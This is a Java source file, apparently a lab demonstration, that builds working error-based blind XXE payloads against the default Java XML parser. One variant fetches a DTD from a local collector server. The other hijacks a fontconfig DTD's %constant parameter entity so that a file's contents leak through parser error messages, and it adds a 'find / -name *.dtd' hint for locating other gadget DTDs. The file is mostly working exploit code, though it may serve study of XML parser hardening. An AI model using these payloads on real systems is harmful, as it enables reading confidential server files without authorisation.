/*
 * §5.4, §5.5 - error-based blind XXE, remote DTD vs a DTD already on the target's disk.
 * Both leak the file contents inside the parser's error message; the local-DTD form
 * is the one that needs no outbound connection at all.
 *
 *   javac LocalDtdError.java && java LocalDtdError
 *
 * Case 2 needs no network at all: it loads a DTD that ships with fontconfig and
 * redefines the %constant parameter entity it declares at line 148, which lets the
 * injected declarations land in an *external* subset where PE nesting is legal.
 */
import javax.xml.parsers.*;
import org.xml.sax.*;
import java.io.*;

public class LocalDtdError {

    static void parse(String label, String xml) {
        System.out.println("=== " + label + " ===");
        try {
            DocumentBuilder b = DocumentBuilderFactory.newInstance().newDocumentBuilder();
            b.setErrorHandler(new ErrorHandler() {
                public void warning(SAXParseException e)    { System.out.println("  WARN : " + e.getMessage()); }
                public void error(SAXParseException e)      { System.out.println("  ERROR: " + e.getMessage()); }
                public void fatalError(SAXParseException e) { System.out.println("  FATAL: " + e.getMessage()); }
            });
            b.parse(new InputSource(new StringReader(xml)));
            System.out.println("  (parsed with no error)");
        } catch (Throwable t) {
            for (Throwable c = t; c != null; c = c.getCause()) {
                String m = String.valueOf(c.getMessage()).replace("\n", " ");
                System.out.println("  " + c.getClass().getSimpleName() + ": " + m.substring(0, Math.min(300, m.length())));
            }
        }
    }

    public static void main(String[] a) {
        String target = new File("tmp/secret.txt").getAbsolutePath();
        String gadget = "/usr/share/xml/fontconfig/fonts.dtd";

        parse("remote DTD (collector must be running) - leaks via FileNotFoundException",
            "<?xml version=\"1.0\"?><!DOCTYPE r ["
          + "<!ENTITY % dtd SYSTEM \"http://127.0.0.1:8123/error.dtd\">%dtd;]><r>x</r>");

        if (!new File(gadget).isFile()) {
            System.out.println("=== local DTD === skipped: " + gadget + " not present "
                             + "(find another with: find / -name '*.dtd')");
            return;
        }
        parse("LOCAL DTD, no network - expect the file contents in the error",
            "<?xml version=\"1.0\"?>\n"
          + "<!DOCTYPE r [\n"
          + "  <!ENTITY % local_dtd SYSTEM \"file://" + gadget + "\">\n"
          + "  <!ENTITY % constant 'aaa)>\n"
          + "     <!ENTITY &#x25; file SYSTEM \"" + target + "\">\n"
          + "     <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">\n"
          + "     &#x25;eval;\n"
          + "     &#x25;error;\n"
          + "     <!ELEMENT aa (bb'>\n"
          + "  %local_dtd;\n"
          + "]>\n<r>x</r>");
    }
}
